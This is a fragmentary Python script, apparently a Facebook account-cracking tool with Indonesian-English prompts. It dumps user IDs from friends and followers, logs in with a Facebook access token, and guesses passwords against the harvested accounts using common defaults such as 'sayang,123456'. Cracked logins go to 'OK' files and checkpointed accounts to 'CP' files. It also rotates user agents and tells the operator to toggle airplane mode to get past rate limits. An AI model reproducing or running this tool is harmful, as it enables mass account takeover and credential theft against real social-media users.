...
def menu():
	...
	print("[++] Ip Kamu   : "+ip+"\n")
	print(C+"["+P+"01"+C+"]"+P+" Dump Id From Friends/Public")
	print(C+"["+P+"02"+C+"]"+P+" Dump Id Of Followers/Follow")
	print(C+"["+P+"03"+C+"]"+P+" Dump Id Of Friends + Followers/Public + Follow")
	print(C+"["+P+"04"+C+"]"+P+" start Crack/Start Crack")
	print(C+"["+P+"05"+C+"]"+P+" change User Agent")
	print(C+"["+P+"06"+C+"]"+P+" Check Facebook Account Options ")
	print(C+"["+P+"00"+C+"]"+P+" Exit (Delete token)")
	ba=input("\n"+war+"Choose : ")
	if ba in [""," "]:
		print(war+"Don't Empty Bitch")
		time.sleep(2)
		menu()
	elif ba in ["1","01"]:
		dump_public()
...
def relogin():
	...
	try:
		...
		relogin()
	jalan("Total Account Facebook : \033[1;32m%s\033[1;37m"%(len(rfiles)))
	for sz in rfiles:
		linez = sz.replace("\n","")
		symbz  = linez.split("|")
		print("(-----------------------------------------------------------------)")
...
class crackmenu:
    ...
    def passmenu(self,isifile):
        try:
            ...
            time.sleep(2)
            menu()
        print('\n\n'+war+'Do you want to use manual password ? y/n')
        zk = input(inp+'Choose : ')
        if zk in ('y','Y'):
            while True:
                jalan(war+"Example Password : sayang,123456")
                pwx = input('\n'+inp+"Masukan Password : ")
                jalan("%sThe Password You Use : %s%s"%(war,I,pwx))
                if pwx == '':
                    jalan(war+"Isi Password Correctly !!")
                elif len(pwx)<=5:
                    jalan(war+"Password Minimal 6 Huruf !!")
                else:
                    jalan("\n\n"+war+"On Turn Off Airplane Mode If No Result\n"+war+"Crack Results That CP Is Saved In : "+K+"Results/CP-"+durasi+".txt\n"+war+"OK Crack Results Saved In : "+I+"Results/OK-"+durasi+".txt\n\n")
                    def zkth(zsc=None):
                ...
                jalan("[++] Please choose the password you want to login !!")
                print("[01] Quick Crack Few Results")
                print("[02] Crack Slow Great Results")
                print("[03] Slow Crack with Big Results")
                ja = input("[??] Pilih : ")
                ...
                if ja in [""," "]:
                        ...
                        jalan(war+"On Turn Off Airplane Mode If No Result\n"+war+"Crack Results That CP Is Saved In : "+K+"Results/CP-"+durasi+".txt\n"+war+"OK Crack Results Saved In : "+I+"Results/OK-"+durasi+".txt\n\n")
                        self.passwords()
                        exit()
                elif ja in ["2","02"]:
                        jalan(war+"On Turn Off Airplane Mode If No Result\n"+war+"Crack Results That CP Is Saved In : "+K+"Results/CP-"+durasi+".txt\n"+war+"OK Crack Results Saved In : "+I+"Results/OK-"+durasi+".txt\n\n")
...
def login():
    os.system("clear")
    toket = input(war+"Enter Token Facebook : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
...
def dump_public():
	...
	jalan(war+"Name Result Dump : "+I+"dump/"+filex+".json")
	jalan(war+"Please Copy the Dump Result Name !!")
	input(war+"Click Enter !!")
	menu()
